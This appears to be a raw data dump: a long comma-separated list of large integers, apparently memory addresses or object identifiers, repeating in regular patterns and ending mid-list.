140224210382690, 140224210382674, 140224210382675, 140224210382689, 140224210382675, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382675, 140224210382690, 140224210382675, 140224210382676, 140224210382677, 140224210382676, 140224210382677, 140224210382678, 140224210382679, 140224210382678, 140224210382679, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382676, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382676, 140224210382690, 140224210382676, 140224210382677, 140224210382678, 140224210382677, 140224210382678, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382677, 140224210382690, 140224210382677, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382678, 140224210382690, 140224210382678, 140224210382679, 140224210382689, 140224210382679, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382679, 140224210382690, 140224210382679, 140224210382680, 140224210382681, 140224210382680, 140224210382681, 140224210382682, 140224210382683, 140224210382682, 140224210382683, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382680, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382680, 140224210382690, 140224210382680, 140224210382681, 140224210382682, 140224210382681, 140224210382682, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382681, 140224210382690, 140224210382681, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382682, 140224210382690, 140224210382682, 140224210382683, 140224210382689, 140224210382683, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382683, 140224210382690, 140224210382683, 140224210382684, 140224210382685, 140224210382684, 140224210382685, 140224210382686, 140224210382687, 140224210382686, 140224210382687, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382684, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382684, 140224210382690, 140224210382684, 140224210382685, 140224210382686, 140224210382685, 140224210382686, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382685, 140224210382690, 140224210382685, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382686, 140224210382690, 140224210382686, 140224210382687, 140224210382689, 140224210382687, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382687, 140224210382690, 140224210382687, 140224210382673, 140224210382677, 140224210382681, 140224210382685, 140224210382688, 140224210382674, 140224210382682, 140224210382688, 140224210382678, 140224210382686, 140224210382688, 140224210382675, 140224210382687, 140224210382683, 140224210382679, 140224210382688, 140224210382672, 140224210382688, 140224210382676, 140224210382689, 140224210382680, 140224210382690, 140224210382684, 140224210382691, 140224210382672, 140224210382673, 140224210382672, 140224210382673, 140224210382674, 140224210382675, 140224210382674, 140224210382675, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382672, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382672, 140224210382690, 140224210382672, 140224210382673, 140224210382674, 140224210382673, 140224210382674, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382673, 140224210382690, 140224210382673, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382674, 140224210382690, 140224210382674, 140224210382675, 140224210382689, 140224210382675, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382675, 140224210382690, 140224210382675, 140224210382676, 140224210382677, 140224210382676, 140224210382677, 140224210382678, 140224210382679, 140224210382678, 140224210382679, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382676, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382676, 140224210382690, 140224210382676, 140224210382677, 140224210382678, 140224210382677, 140224210382678, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382677, 140224210382690, 140224210382677, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382678, 140224210382690, 140224210382678, 140224210382679, 140224210382689, 140224210382679, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382679, 140224210382690, 140224210382679, 140224210382680, 140224210382681, 140224210382680, 140224210382681, 140224210382682, 140224210382683, 140224210382682, 140224210382683, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382680, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382680, 140224210382690, 140224210382680, 140224210382681, 140224210382682, 140224210382681, 140224210382682, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382681, 140224210382690, 140224210382681, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382682, 140224210382690, 140224210382682, 140224210382683, 140224210382689, 140224210382683, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382683, 140224210382690, 140224210382683, 140224210382684, 140224210382685, 140224210382684, 140224210382685, 140224210382686, 140224210382687, 140224210382686, 140224210382687, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382684, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382684, 140224210382690, 140224210382684, 140224210382685, 140224210382686, 140224210382685, 140224210382686, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382685, 140224210382690, 140224210382685, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382686, 140224210382690, 140224210382686, 140224210382687, 140224210382689, 140224210382687, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382687, 140224210382690, 140224210382687, 140224210382673, 140224210382677, 140224210382681, 140224210382685, 140224210382688, 140224210382674, 140224210382682, 140224210382688, 140224210382678, 140224210382686, 140224210382688, 140224210382675, 140224210382687, 140224210382683, 140224210382679, 140224210382688, 140224210382672, 140224210382688, 140224210382676, 140224210382689, 140224210382680, 140224210382690, 140224210382684, 140224210382691, 140224210382672, 140224210382673, 140224210382672, 140224210382673, 140224210382674, 140224210382675, 140224210382674, 140224210382675, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382672, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382672, 140224210382690, 140224210382672, 140224210382673, 140224210382674, 140224210382673, 140224210382674, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382673, 140224210382690, 140224210382673, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382674, 140224210382690, 140224210382674, 140224210382675, 140224210382689, 140224210382675, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382675, 140224210382690, 140224210382675, 140224210382676, 140224210382677, 140224210382676, 140224210382677, 140224210382678, 140224210382679, 140224210382678, 140224210382679, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382676, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382676, 140224210382690, 140224210382676, 140224210382677, 140224210382678, 140224210382677, 140224210382678, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382677, 140224210382690, 140224210382677, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382678, 140224210382690, 140224210382678, 140224210382679, 140224210382689, 140224210382679, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382679, 140224210382690, 140224210382679, 140224210382680, 140224210382681, 140224210382680, 140224210382681, 140224210382682, 140224210382683, 140224210382682, 140224210382683, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382680, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382680, 140224210382690, 140224210382680, 140224210382681, 140224210382682, 140224210382681, 140224210382682, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382681, 140224210382690, 140224210382681, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382682, 140224210382690, 140224210382682, 140224210382683, 140224210382689, 140224210382683, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382683, 140224210382690, 140224210382683, 140224210382684, 140224210382685, 140224210382684, 140224210382685, 140224210382686, 140224210382687, 140224210382686, 140224210382687, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382684, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382684, 140224210382690, 140224210382684, 140224210382685, 140224210382686, 140224210382685, 140224210382686, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382685, 140224210382690, 140224210382685, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382686, 140224210382690, 140224210382686, 140224210382687, 140224210382689, 140224210382687, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382687, 140224210382690, 140224210382687, 140224210382673, 140224210382677, 140224210382681, 140224210382685, 140224210382688, 140224210382674, 140224210382682, 140224210382688, 140224210382678, 140224210382686, 140224210382688, 140224210382675, 140224210382687, 140224210382683, 140224210382679, 140224210382688, 140224210382672, 140224210382688, 140224210382676, 140224210382689, 140224210382680, 140224210382690, 140224210382684, 140224210382691, 140224210382672, 140224210382673, 140224210382672, 140224210382673, 140224210382674, 140224210382675, 140224210382674, 140224210382675, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382672, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382672, 140224210382690, 140224210382672, 140224210382673, 140224210382674, 140224210382673, 140224210382674, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382673, 140224210382690, 140224210382673, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382674, 140224210382690, 140224210382674, 140224210382675, 140224210382689, 140224210382675, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382675, 140224210382690, 140224210382675, 140224210382676, 140224210382677, 140224210382676, 140224210382677, 140224210382678, 140224210382679, 140224210382678, 140224210382679, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382676, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382676, 140224210382690, 140224210382676, 140224210382677, 140224210382678, 140224210382677, 140224210382678, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382677, 140224210382690, 140224210382677, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382678, 140224210382690, 140224210382678, 140224210382679, 140224210382689, 140224210382679, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382679, 140224210382690, 140224210382679, 140224210382680, 140224210382681, 140224210382680, 140224210382681, 140224210382682, 140224210382683, 140224210382682, 140224210382683, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382680, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382680, 140224210382690, 140224210382680, 140224210382681, 140224210382682, 140224210382681, 140224210382682, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382681, 140224210382690, 140224210382681, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382682, 140224210382690, 140224210382682, 140224210382683, 140224210382689, 140224210382683, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382683, 140224210382690, 140224210382683, 140224210382684, 140224210382685, 140224210382684, 140224210382685, 140224210382686, 140224210382687, 140224210382686, 140224210382687, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382684, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382684, 140224210382690, 140224210382684, 140224210382685, 140224210382686, 140224210382685, 140224210382686, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382685, 140224210382690, 140224210382685, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382686, 140224210382690, 140224210382686, 140224210382687, 140224210382689, 140224210382687, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382687, 140224210382690, 140224210382687, 140224210382673, 140224210382677, 140224210382681, 140224210382685, 140224210382688, 140224210382674, 140224210382682, 140224210382688, 140224210382678, 140224210382686, 140224210382688, 140224210382675, 140224210382687, 140224210382683, 140224210382679, 140224210382688, 140224210382672, 140224210382688, 140224210382676, 140224210382689, 140224210382680, 140224210382690, 140224210382684, 140224210382691, 140224210382672, 140224210382673, 140224210382672, 140224210382673, 140224210382674, 140224210382675, 140224210382674, 140224210382675, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382672, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382672, 140224210382690, 140224210382672, 140224210382673, 140224210382674, 140224210382673, 140224210382674, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382673, 140224210382690, 140224210382673, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382674, 140224210382690, 140224210382674, 140224210382675, 140224210382689, 140224210382675, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382675, 140224210382690, 140224210382675, 140224210382676, 140224210382677, 140224210382676, 140224210382677, 140224210382678, 140224210382679, 140224210382678, 140224210382679, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382676, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382676, 140224210382690, 140224210382676, 140224210382677, 140224210382678, 140224210382677, 140224210382678, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382677, 140224210382690, 140224210382677, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382678, 140224210382690, 140224210382678, 140224210382679, 140224210382689, 140224210382679, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382679, 140224210382690, 140224210382679, 140224210382680, 140224210382681, 140224210382680, 140224210382681, 140224210382682, 140224210382683, 140224210382682, 140224210382683, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382680, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382680, 140224210382690, 140224210382680, 140224210382681, 140224210382682, 140224210382681, 140224210382682, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382681, 140224210382690, 140224210382681, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382682, 140224210382690, 140224210382682, 140224210382683, 140224210382689, 140224210382683, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382683, 140224210382690, 140224210382683, 140224210382684, 140224210382685, 140224210382684, 140224210382685, 140224210382686, 140224210382687, 140224210382686, 140224210382687, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382684, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382684, 140224210382690, 140224210382684, 140224210382685, 140224210382686, 140224210382685, 140224210382686, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382685, 140224210382690, 140224210382685, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382686, 140224210382690, 140224210382686, 140224210382687, 140224210382689, 140224210382687, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382687, 140224210382690, 140224210382687, 140224210382673, 140224210382677, 140224210382681, 140224210382685, 140224210382688, 140224210382674, 140224210382682, 140224210382688, 140224210382678, 140224210382686, 140224210382688, 140224210382675, 140224210382687, 140224210382683, 140224210382679, 140224210382688, 140224210382672, 140224210382688, 140224210382676, 140224210382689, 140224210382680, 140224210382690, 140224210382684, 140224210382691, 140224210382672, 140224210382673, 140224210382672, 140224210382673, 140224210382674, 140224210382675, 140224210382674, 140224210382675, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382672, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382672, 140224210382690, 140224210382672, 140224210382673, 140224210382674, 140224210382673, 140224210382674, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382673, 140224210382690, 140224210382673, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382674, 140224210382690, 140224210382674, 140224210382675, 140224210382689, 140224210382675, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382675, 140224210382690, 140224210382675, 140224210382676, 140224210382677, 140224210382676, 140224210382677, 140224210382678, 140224210382679, 140224210382678, 140224210382679, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382676, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382676, 140224210382690, 140224210382676, 140224210382677, 140224210382678, 140224210382677, 140224210382678, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382677, 140224210382690, 140224210382677, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382678, 140224210382690, 140224210382678, 140224210382679, 140224210382689, 140224210382679, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382679, 140224210382690, 140224210382679, 140224210382680, 140224210382681, 140224210382680, 140224210382681, 140224210382682, 140224210382683, 140224210382682, 140224210382683, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382680, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382680, 140224210382690, 140224210382680, 140224210382681, 140224210382682, 140224210382681, 140224210382682, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382681, 140224210382690, 140224210382681, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382682, 140224210382690, 140224210382682, 140224210382683, 140224210382689, 140224210382683, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382683, 140224210382690, 140224210382683, 140224210382684, 140224210382685, 140224210382684, 140224210382685, 140224210382686, 140224210382687, 140224210382686, 140224210382687, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382684, 140224210382691, 140224210382688, 140224210382691, 140224210382688, 140224210382691, 140224210382690, 140224210382684, 140224210382690, 140224210382684, 140224210382685, 140224210382686, 140224210382685, 140224210382686, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382685, 140224210382690, 140224210382685, 140224210382692, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382690, 140224210382686, 140224210382690, 140224210382686, 140224210382687, 140224210382689, 140224210382687, 140224210382689, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382690, 140224210382687, 140224210382690, 140224210382687, 140224210382673, 140224210382677, 140224210382681, 140224210382685, 140224210382688, 140224210382674, 140224210382682, 140224210382688, 140224210382678, 140224210382686, 140224210382688, 140224210382675, 140224210382687, 140224210382683, 140224210382679, 140224210382688, 140224210382672, 140224210382688, 140224210382676, 140224210382689, 140224210382680, 140224210382690, 140224210382684, 140224210382691, 140224210382672, 140224210382673, 140224210382674, 140224210382675, 140224210382676, 140224210382677, 140224210382678, 140224210382679, 140224210382680, 140224210382681, 140224210382682, 140224210382683, 140224210382684, 140224210382685, 140224210382686, 140224210382687, 140224210382688, 140224210382689, 140224210382690, 140224210382691, 140224210382692, 140224210382672, 140224210382712, 140224210382672, 140224210382712, 140224210382713, 140224210382673, 140224210382713, 140224210382673, 140224210382711, 140224210382675, 140224210382711, 140224210382675, 140224210382674, 140224210382710, 140224210382674, 140224210382710, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382694, 140224210382693, 140224210382694, 140224210382693, 140224210382713, 140224210382672, 140224210382691, 140224210382697, 140224210382691, 140224210382697, 140224210382691, 140224210382690, 140224210382672, 140224210382690, 140224210382672, 140224210382694, 140224210382688, 140224210382694, 140224210382688, 140224210382694, 140224210382695, 140224210382713, 140224210382695, 140224210382713, 140224210382712, 140224210382711, 140224210382712, 140224210382711, 140224210382673, 140224210382674, 140224210382673, 140224210382674, 140224210382695, 140224210382690, 140224210382697, 140224210382690, 140224210382697, 140224210382690, 140224210382688, 140224210382695, 140224210382688, 140224210382695, 140224210382690, 140224210382712, 140224210382690, 140224210382712, 140224210382695, 140224210382673, 140224210382695, 140224210382673, 140224210382692, 140224210382693, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382697, 140224210382693, 140224210382697, 140224210382693, 140224210382695, 140224210382711, 140224210382695, 140224210382711, 140224210382690, 140224210382674, 140224210382690, 140224210382674, 140224210382710, 140224210382689, 140224210382710, 140224210382689, 140224210382675, 140224210382696, 140224210382675, 140224210382696, 140224210382695, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382697, 140224210382695, 140224210382697, 140224210382695, 140224210382695, 140224210382675, 140224210382695, 140224210382675, 140224210382690, 140224210382710, 140224210382690, 140224210382710, 140224210382676, 140224210382708, 140224210382676, 140224210382708, 140224210382709, 140224210382677, 140224210382709, 140224210382677, 140224210382707, 140224210382679, 140224210382707, 140224210382679, 140224210382678, 140224210382706, 140224210382678, 140224210382706, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382694, 140224210382693, 140224210382694, 140224210382693, 140224210382709, 140224210382676, 140224210382691, 140224210382697, 140224210382691, 140224210382697, 140224210382691, 140224210382690, 140224210382676, 140224210382690, 140224210382676, 140224210382694, 140224210382688, 140224210382694, 140224210382688, 140224210382694, 140224210382695, 140224210382709, 140224210382695, 140224210382709, 140224210382708, 140224210382707, 140224210382708, 140224210382707, 140224210382677, 140224210382678, 140224210382677, 140224210382678, 140224210382695, 140224210382690, 140224210382697, 140224210382690, 140224210382697, 140224210382690, 140224210382688, 140224210382695, 140224210382688, 140224210382695, 140224210382690, 140224210382708, 140224210382690, 140224210382708, 140224210382695, 140224210382677, 140224210382695, 140224210382677, 140224210382692, 140224210382693, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382697, 140224210382693, 140224210382697, 140224210382693, 140224210382695, 140224210382707, 140224210382695, 140224210382707, 140224210382690, 140224210382678, 140224210382690, 140224210382678, 140224210382706, 140224210382689, 140224210382706, 140224210382689, 140224210382679, 140224210382696, 140224210382679, 140224210382696, 140224210382695, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382697, 140224210382695, 140224210382697, 140224210382695, 140224210382695, 140224210382679, 140224210382695, 140224210382679, 140224210382690, 140224210382706, 140224210382690, 140224210382706, 140224210382680, 140224210382704, 140224210382680, 140224210382704, 140224210382705, 140224210382681, 140224210382705, 140224210382681, 140224210382703, 140224210382683, 140224210382703, 140224210382683, 140224210382682, 140224210382702, 140224210382682, 140224210382702, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382694, 140224210382693, 140224210382694, 140224210382693, 140224210382705, 140224210382680, 140224210382691, 140224210382697, 140224210382691, 140224210382697, 140224210382691, 140224210382690, 140224210382680, 140224210382690, 140224210382680, 140224210382694, 140224210382688, 140224210382694, 140224210382688, 140224210382694, 140224210382695, 140224210382705, 140224210382695, 140224210382705, 140224210382704, 140224210382703, 140224210382704, 140224210382703, 140224210382681, 140224210382682, 140224210382681, 140224210382682, 140224210382695, 140224210382690, 140224210382697, 140224210382690, 140224210382697, 140224210382690, 140224210382688, 140224210382695, 140224210382688, 140224210382695, 140224210382690, 140224210382704, 140224210382690, 140224210382704, 140224210382695, 140224210382681, 140224210382695, 140224210382681, 140224210382692, 140224210382693, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382697, 140224210382693, 140224210382697, 140224210382693, 140224210382695, 140224210382703, 140224210382695, 140224210382703, 140224210382690, 140224210382682, 140224210382690, 140224210382682, 140224210382702, 140224210382689, 140224210382702, 140224210382689, 140224210382683, 140224210382696, 140224210382683, 140224210382696, 140224210382695, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382697, 140224210382695, 140224210382697, 140224210382695, 140224210382695, 140224210382683, 140224210382695, 140224210382683, 140224210382690, 140224210382702, 140224210382690, 140224210382702, 140224210382684, 140224210382700, 140224210382684, 140224210382700, 140224210382701, 140224210382685, 140224210382701, 140224210382685, 140224210382699, 140224210382687, 140224210382699, 140224210382687, 140224210382686, 140224210382698, 140224210382686, 140224210382698, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382694, 140224210382693, 140224210382694, 140224210382693, 140224210382701, 140224210382684, 140224210382691, 140224210382697, 140224210382691, 140224210382697, 140224210382691, 140224210382690, 140224210382684, 140224210382690, 140224210382684, 140224210382694, 140224210382688, 140224210382694, 140224210382688, 140224210382694, 140224210382695, 140224210382701, 140224210382695, 140224210382701, 140224210382700, 140224210382699, 140224210382700, 140224210382699, 140224210382685, 140224210382686, 140224210382685, 140224210382686, 140224210382695, 140224210382690, 140224210382697, 140224210382690, 140224210382697, 140224210382690, 140224210382688, 140224210382695, 140224210382688, 140224210382695, 140224210382690, 140224210382700, 140224210382690, 140224210382700, 140224210382695, 140224210382685, 140224210382695, 140224210382685, 140224210382692, 140224210382693, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382697, 140224210382693, 140224210382697, 140224210382693, 140224210382695, 140224210382699, 140224210382695, 140224210382699, 140224210382690, 140224210382686, 140224210382690, 140224210382686, 140224210382698, 140224210382689, 140224210382698, 140224210382689, 140224210382687, 140224210382696, 140224210382687, 140224210382696, 140224210382695, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382697, 140224210382695, 140224210382697, 140224210382695, 140224210382695, 140224210382687, 140224210382695, 140224210382687, 140224210382690, 140224210382698, 140224210382690, 140224210382698, 140224210382712, 140224210382677, 140224210382673, 140224210382708, 140224210382704, 140224210382681, 140224210382685, 140224210382700, 140224210382697, 140224210382688, 140224210382711, 140224210382674, 140224210382703, 140224210382682, 140224210382697, 140224210382688, 140224210382678, 140224210382699, 140224210382707, 140224210382686, 140224210382688, 140224210382697, 140224210382675, 140224210382710, 140224210382687, 140224210382698, 140224210382702, 140224210382683, 140224210382679, 140224210382706, 140224210382688, 140224210382697, 140224210382713, 140224210382672, 140224210382688, 140224210382697, 140224210382709, 140224210382676, 140224210382696, 140224210382689, 140224210382705, 140224210382680, 140224210382690, 140224210382695, 140224210382701, 140224210382684, 140224210382694, 140224210382691, 140224210382672, 140224210382712, 140224210382672, 140224210382712, 140224210382713, 140224210382673, 140224210382713, 140224210382673, 140224210382711, 140224210382675, 140224210382711, 140224210382675, 140224210382674, 140224210382710, 140224210382674, 140224210382710, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382694, 140224210382693, 140224210382694, 140224210382693, 140224210382713, 140224210382672, 140224210382691, 140224210382697, 140224210382691, 140224210382697, 140224210382691, 140224210382690, 140224210382672, 140224210382690, 140224210382672, 140224210382694, 140224210382688, 140224210382694, 140224210382688, 140224210382694, 140224210382695, 140224210382713, 140224210382695, 140224210382713, 140224210382712, 140224210382711, 140224210382712, 140224210382711, 140224210382673, 140224210382674, 140224210382673, 140224210382674, 140224210382695, 140224210382690, 140224210382697, 140224210382690, 140224210382697, 140224210382690, 140224210382688, 140224210382695, 140224210382688, 140224210382695, 140224210382690, 140224210382712, 140224210382690, 140224210382712, 140224210382695, 140224210382673, 140224210382695, 140224210382673, 140224210382692, 140224210382693, 140224210382688, 140224210382692, 140224210382688, 140224210382692, 140224210382697, 140224210382693, 140224210382697, 140224210382693, 140224210382695, 140224210382711, 140224210382695, 140224210382711, 140224210382690, 140224210382674, 140224210382690, 140224210382674, 140224210382710, 140224210382689, 140224210382710, 140224210382689, 140224210382675, 140224210382696, 140224210382675, 140224210382696, 140224210382695, 140224210382690, 140224210382688, 140224210382690, 140224210382688, 140224210382690, 140224210382697, 140224210382695, 140224210382697, 140224210382695, 140224210382695, 140224210382675, 140224210382695, 140224210382675, 140224210382690, 140224210382710, 140224210382690, 140224210382710, 140224210382676, 140224210382708, 140224210382676, 140224210382708, 140224210382709, 140224210382677, 140224210382709, 140224210382677, 140224210382707, 140224210382679, 140224210382707, 140224210382679, 140224210382678, 140224210382706, 140224210382678, 140224210382706, 140224210382691, 140224210382692, 140224210382691, 140224210382692, 140224210382694, 140224210382693, 140224210382694, 140224210382693, 140224210382709, 140224210382676, 140224210382691, 140224210382697, 140224210382691, 140224210382697, 140224210382691, 140224210382690, 140224210382676, 